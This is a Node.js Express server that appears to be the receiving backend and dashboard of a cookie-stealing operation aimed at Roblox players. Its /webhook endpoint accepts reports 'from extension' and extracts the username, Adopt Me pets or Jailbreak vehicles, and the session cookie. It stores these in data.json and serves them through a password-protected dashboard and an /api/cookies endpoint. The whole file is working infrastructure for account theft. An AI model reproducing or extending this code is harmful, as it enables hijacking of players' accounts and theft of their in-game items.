const express = require('express');
const fs = require('fs');
const path = require('path');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');

const app = express();
const SECRET = 'luci-secret-change-me';    // change this to something random
const VALID_USER = 'luci';
const VALID_PASS = 'luci';
const DATA_FILE = path.join(__dirname, 'data.json');

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

// ---------- data helpers ----------
function loadData() {
  try {
    if (fs.existsSync(DATA_FILE)) return JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
  } catch (_) {}
  return { jailbreak: [], adoptme: [] };
}

function saveData(data) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

// ---------- webhook receiver (from extension) ----------
app.post('/webhook', (req, res) => {
  const { content } = req.body;
  if (!content) return res.status(400).send('Missing content');

  const data = loadData();
  const lines = content.split('\n');
  let entry = {}, type = 'adoptme';   // default if no vehicle info

  for (const line of lines) {
    const clean = line.replace(/\*\*/g, '').trim();
    if (clean.startsWith('Username:')) entry.username = clean.split('Username:')[1].trim();
    if (clean.startsWith('Pets:')) { entry.pet = clean.split('Pets:')[1].trim(); type = 'adoptme'; }
    if (clean.startsWith('Vehicle:')) { entry.vehicle = clean.split('Vehicle:')[1].trim(); type = 'jailbreak'; }
    if (clean.startsWith('Cookie:')) {
      const match = clean.match(/\|\|`(.+?)`\|\|/);
      if (match) entry.cookie = match[1];
    }
  }

  if (entry.username && entry.cookie) {
    data[type].push(entry);
    saveData(data);
    console.log(`New ${type} entry from ${entry.username}`);
  }

  res.status(200).send('OK');
});

// ---------- login ----------
app.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'login.html'));
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  if (username === VALID_USER && password === VALID_PASS) {
    const token = jwt.sign({ user: username }, SECRET, { expiresIn: '8h' });
    res.cookie('auth_token', token, { httpOnly: true, secure: false, sameSite: 'lax' });
    return res.redirect('/dashboard');
  }
  res.redirect('/login?error=1');
});

// ---------- logout ----------
app.get('/logout', (req, res) => {
  res.clearCookie('auth_token');
  res.redirect('/login');
});

// ---------- dashboard (protected) ----------
function authMiddleware(req, res, next) {
  const token = req.cookies?.auth_token;
  if (!token) return res.redirect('/login');
  try {
    jwt.verify(token, SECRET);
    next();
  } catch (err) {
    res.redirect('/login');
  }
}

app.get('/dashboard', authMiddleware, (req, res) => {
  res.sendFile(path.join(__dirname, 'dashboard.html'));
});

// API for dashboard data
app.get('/api/cookies', authMiddleware, (req, res) => {
  res.json(loadData());
});

// home redirect
app.get('/', (req, res) => res.redirect('/login'));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Dashboard running on port ${PORT}`));